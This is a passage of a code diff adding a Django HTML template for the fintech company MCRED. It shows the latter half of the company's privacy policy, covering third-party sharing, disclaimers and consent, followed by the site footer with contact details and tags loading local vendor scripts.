+            <p class="text-left">There are services and/or products offered by third parties on the Website. If you choose to apply for these third-party products and/or services, then their use of your Information shall be governed by their privacy policies and MCRED shall not be responsible for their use of your Information and their privacy policies. MCRED shall not be responsible or liable, directly or indirectly, for any damage or loss caused or alleged to be caused by or in connection with use of or reliance on any such content, goods or services available on or through any such site or resource.</p>
+
+            <p class="text-left"><b>New Products and Services</b></p>
+
+            <p class="text-left">MCRED may use your Information to intimate you for any new products, services, offers and/or promotions being offered by MCRED or any of its affiliate(s), third partners or service partners.</p>
+
+            <p class="text-left"><b>Other</b></p>
+
+            <p class="text-left">We may from time to time add or enhance products/services available on our Website. To the extent these products/services are provided to and used by you, we will use the information you provide in this regard to facilitate the products/service requested. For example, if you email us with a question, we will use your email address, name, nature of the question, etc. to respond to your question. We may also store and publish such information to assist us in making the Website better and easier to use.</p>
+
+            <p class="text-left"><b>Promotional Initiatives</b></p>
+
+            <p class="text-left">MCRED may have presence on social networking websites including but not limited to LinkedIn, Facebook, Twitter, YouTube and blogs which are promotional and business initiatives to connect to a larger group of people. The domain links contained therein may either direct you to our Website or request your participation by way of feedback, suggestions. MCRED in this regard fully disclaims any liability (ies) or claim(s), which may arise by use/misuse of your feedback, suggestions, views, etc. on any of the aforementioned networking websites or blogs, by any third party whether or not known to MCRED.</p>
+
+            <p class="text-left"><b>Links to Other Sites</b></p>
+
+            <p class="text-left">Our Website may contain links to other websites. If you click on a third-party link, you will be directed to that website. Note that these external sites are not operated by us. Therefore, we strongly advise you to review the privacy policy of these websites. We have no control over and assume no responsibility for the content, privacy policies, or practices of any third-party sites or services.</p>
+
+            <p class="text-left"><b>How does MCRED use the information that it collects?</b></p>
+
+            <p class="text-left">Information shared by you is used by us and/or authorized third parties/service partners/affiliate(s) to support your interaction with us, to offer you services in the best possible manner and to contact you again about other services and products that we and/or authorized third parties/service partners/affiliate(s) offer. By submitting your Information to MCRED, you expressly acknowledge and consent to MCRED to use such Information and to process the same in a manner deemed fit by MCRED. This may involve conducting data analysis, research based on reviews about deals, transfer of your Information to third party experts for the purpose of outsourcing services offered to you by MCRED, transfer your Information to third parties/ service partners for providing you services offered by such third parties and service partners etc.</p>
+
+            <p class="text-left"><b>Disclaimer &amp; Liabilities</b></p>
+
+            <p class="text-left">MCRED is committed to protecting the privacy and the confidentiality of your Personal Information. Whenever MCRED obtains Information from you, our Website uses commercially reasonable efforts and general industry standards to protect it from any unauthorized access or disclosure. MCRED uses its best endeavours to maintain physical, electronic, and procedural safeguards that aim to protect your information against loss, misuse, damage, modification, and unauthorized access or disclosure. However, MCRED assumes no liability whatsoever for any disclosure of Information to any third party(ies) and/ or service partners for providing any services to you by such third parties and/ or service partners. MCRED disclaims any liability for the use of your Information by such third party(ies) and/or service partners and their privacy policies. The content that you store, post, or transmit on or through our Website, may be accessed by other users (registered or unregistered), including people that you do not know. The content/images that you post/share on our Website may be prone to misuse by a party not known to you. MCRED in this regard fully disclaims any liability (ies) or claim(s), which may arise by use/misuse of such content, by any third party or any party not known to MCRED. We suggest that you exercise care and caution in communicating with other users and only disclose your information to other users that you know to be trustworthy. You should not assume that your content will be kept private.<br>
+            <br>
+            MCRED makes every reasonable effort to preserve the privacy and confidentiality of your information shared with us. We implement standard measures to protect against unauthorized access to and unlawful interception of Personal Information. However, no Internet website can fully eliminate security risks.<br>
+            <br>
+            We reserve the right to disclose information shared by you without your consent (express or implied) and without any liabilities to you when required or permitted by law and we have a good-faith belief that (i) such action is necessary to comply with an appropriate law enforcement investigation, current judicial proceeding, a court order or legal process served on us or (ii) to conform to the legal requirements, compliance/reporting to administrative and judicial authorities, as may be required (iii) protect and defend the rights or property of the website owners of MCRED, or the users of MCRED, (iv) person(s) or company (ies) who provide certain support services to us, or (v) person(s) or company (ies) who share certain responsibilities/obligations of MCRED and (vi) to third parties/ service partners for providing you services offered by such third parties and service partners. Further, we reserve the right to disclose Information shared by you without your consent with entities engaged in providing the credit scores or credit information related services like CIBIL, etc.<br>
+            <br>
+            Change of Privacy Policy in Future<br>
+            <br>
+            This policy provides a general statement of the ways in which MCRED aims to protect your information. You may, however, in connection with specific products or services offered by MCRED, be provided with privacy policies or statements that substitute or supplement this policy. The terms and conditions of this Privacy Policy may be changed from time to time, without your consent (express or implied) to reflect changes in our practices concerning the collection and use of your information. The revised Privacy Policy will be effective immediately upon posting to our Website unless otherwise mentioned. The revised Privacy Policy shall bind you and it is your sole responsibility to check the same from time to time. You acknowledge that no knowledge of the revised Privacy Policy shall be a defence in any proceedings with regard to the Privacy Policy.</p>
+
+            <p class="text-left"><b>Your Consent</b></p>
+
+            <p class="text-left">By accessing our Website and using it on a continued basis, you expressly consent and confirm to MCRED collecting, maintaining, using, processing and disclosing your Personal Information and other information in accordance with this Privacy Policy.</p>
+
+            <p class="text-left"><b>Contact MCRED</b></p>
+
+            <p class="text-left">For any queries and concerns you can contact us at connect@mcred.com</p>
+            </div>
+            </div>
+            </div>
+            </div>
+        </section>
+  </main>
+
+
+
+
+
+
+
+
+
+  <!-- ======= Footer ======= -->
+    <footer id="footer">
+        <div class="footer-top">
+            <div class="container">
+                <div class="row">
+                    <div class="col-sm-12 col-lg-4 col-md-4">
+                        <div class="footer-aboutus">
+                            <img src="{% static '/images/portalLogin/home/MCRED1.png' %}">
+                            <p>
+                                403, Peninsula Heights,
+                                C D Barfiwala Marg,<br>
+                                Juhu Lane,
+                                Andheri (W),
+                                Mumbai, Pin - 400058<br>
+                                Maharashtra
+                            </p>
+                        </div>
+                    </div>
+                    <div class="col-sm-12 col-lg-1 col-md-1"></div>
+                    <div class="col-sm-12 col-lg-7 col-md-7">
+                        <div class="row">
+                            <div class="col-lg-4 col-md-4 col-sm-6 col-6 footer-links">
+                                <div class="settextfloat">
+                                    <h4>Contact Us</h4>
+                                    <ul>
+                                        <li><a href="#">connect@mcred.com</a></li>
+                                        <li><a href="#"> Support - 797-7157-822 </a></li>
+                                        <li> <a href="#">Office - 797-7157-822</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <!-- <div class="col-lg-3 col-md-3 col-sm-6 col-6 footer-links ">
+                              <div class="settextfloat">
+                                <h4>Customer Service</h4>
+                                <ul>
+                                  <li><a href="#">Pricing </a></li>
+                                  <li><a href="#">Contact</a></li>
+                                  <li> <a href="#">Us FAQs</a></li>
+                                </ul>
+                              </div>
+                            </div> -->
+                            <div class="col-lg-4 col-md-4 col-sm-6 col-6 footer-links ">
+                                <div class="settextfloat">
+                                    <h4>Need Help?</h4>
+                                    <ul>
+                                        <li> <a href="{% url 'mcred_privacy_policy' %}">Privacy Policy </a></li>
+                                        <li> <a href="{% url 'mcred_terms_conditions' %}">Terms &amp; Conditions </a></li>
+                                        <li> <a href="{% url 'mcred_faqs' %}">General FAQs</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="col-lg-4 col-md-4 col-sm-6 col-6 footer-links ">
+                                <div class="settextfloat">
+                                    <h4>Links</h4>
+                                    <ul>
+                                        <li> <a href="{% url 'mcred_partner' %}">Partners </a></li>
+                                        <li> <a href="{% url 'mcred_business' %}">Businesses</a></li>
+                                        <li> <a href="{% url 'mcred_investor' %}">Investors</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="lastsection">
+            <div class="container">
+                <div class="copyright">
+                    <div class="row">
+                        <div class="col-lg-6 col-md-6 col-sm-12 footer-links">
+                            <p class="settagfooter">© Copyright Secure. All rights reserved.</p>
+                        </div>
+                        <div class="col-lg-6 col-md-6 col-sm-12 footer-sociel">
+                            <ul>
+                                <li> <a target="_blank" href="https://www.instagram.com/mcre.d/"><i class="fab fa-instagram"></i></a></li>
+                                <li> <a target="_blank" href="https://www.linkedin.com/company/mcred/"><i class="fab fa-linkedin-in"></i></a></li>
+                                <li> <a target="_blank" href="https://www.facebook.com/MCRED-102965945034452"><i class="fab fa-facebook-f"></i></a></li>
+                                <li> <a target="_blank" href="https://twitter.com/Mcred59369762"><i class="fab fa-twitter"></i></a></li>
+                                <li> <a target="_blank" href="https://www.youtube.com/channel/UC33RpFwzAndn3CCJr83jUbw?guided_help_flow=5"><i class="fab fa-youtube"></i></a></li>
+                        </ul>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+    </div></footer>
+
+  <!-- End Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="fas fa-angle-up"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="{% static '/css/vendor/aos/aos.js' %}"></script>
+  <script src="{% static '/css/vendor/bootstrap/js/bootstrap.bundle.min.js' %}"></script>
+  <script src="{% static '/css/vendor/glightbox/js/glightbox.min.js' %}"></script>
+  <script src="{% static '/css/vendor/isotope-layout/isotope.pkgd.min.js' %}"></script>
+  <script src="{% static '/css/vendor/php-email-form/validate.js' %}"></script>
+  <script src="{% static '/css/vendor/purecounter/purecounter.js' %}"></script>
+  <script src="{% static '/css/vendor/swiper/swiper-bundle.min.js' %}"></script>
+
+  <!-- Template Main JS File -->
+  <script src="{% static '/js/main.js' %}"></script>
+
+</body>
+
+</html>
